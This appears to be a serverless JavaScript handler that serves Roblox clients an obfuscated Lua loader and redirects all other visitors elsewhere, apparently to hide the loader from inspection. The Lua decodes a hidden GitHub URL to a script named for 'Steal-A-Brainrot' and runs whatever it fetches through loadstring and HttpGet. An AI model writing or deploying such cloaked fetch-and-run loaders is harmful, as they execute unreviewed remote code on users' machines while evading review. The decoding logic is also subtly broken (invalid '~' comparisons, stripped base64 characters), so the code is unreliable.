export default function handler(req, res) {
    const userAgent = req.headers['user-agent'] || '';
    
    res.setHeader('Content-Type', 'text/plain; charset=utf-8');
    res.setHeader('Cache-Control', 'no-cache');
    
    if (!userAgent.toLowerCase().includes('roblox')) {
        return res.redirect(302, 'https://api.luarmor.net/');
    }

    const Rrl = "https://github.com/Rawbr10/loader/raw/refs/heads/main/ProjectX-Steal-A-Brainrot-Anti-Loader.lua";
    const payload = Buffer.from(Rrl).toString('base64');

    const script = `
local b="${payload}"
local url=""
for i=1,#b,1 do
    local c=b:sub(i,i)
    if c~"+" and c~"=" and c~"/" then
        url=url..c
    end
end
loadstring(game:HttpGet((function(s)
    local t={}
    for i=1,#s,4 do
        local a=s:sub(i,i+3)
        local n=0
        for j=1,4 do
            local v=(a:sub(j,j))
            if v>="A" and v<="Z" then n=n*64+(v:byte()-65)
            elseif v>="a" and v<="z" then n=n*64+(v:byte()-71)
            elseif v>="0" and v<="9" then n=n*64+(v:byte()-48)
            elseif v=="+" then n=n*64+62
            elseif v=="/" then n=n*64+63
            end
        end
        t[#t+1]=string.char(bit32.rshift(n,16),bit32.band(bit32.rshift(n,8),255),bit32.band(n,255))
    end
    return table.concat(t):gsub("%z+$","")
end)(url)))()
`;

    res.status(200).send(script);
}
